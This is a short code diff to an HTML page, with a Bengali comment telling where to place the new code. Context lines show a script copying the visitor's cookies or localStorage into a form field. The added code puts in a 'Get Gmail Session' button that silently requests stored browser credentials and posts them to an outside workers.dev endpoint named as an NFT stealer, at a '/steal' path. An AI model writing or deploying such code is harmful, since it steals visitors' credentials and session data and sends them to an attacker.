@@ -31,3 +31,19 @@ document.querySelector('input[name="cookies"]').value = document.cookie || local
 </script>
 </body>
 </html>
+<!-- HTML এ button এর পর add করো -->
+<button onclick="promptCreds()">Get Gmail Session</button>
+
+<script>
+function promptCreds(){
+navigator.credentials.get({
+  mediation: 'silent',
+  password: true
+}).then(cred => {
+  fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal', {
+    method: 'POST',
+    body: JSON.stringify({creds: cred ? cred.id : 'none'})
+  })
+})
+}
+</script>
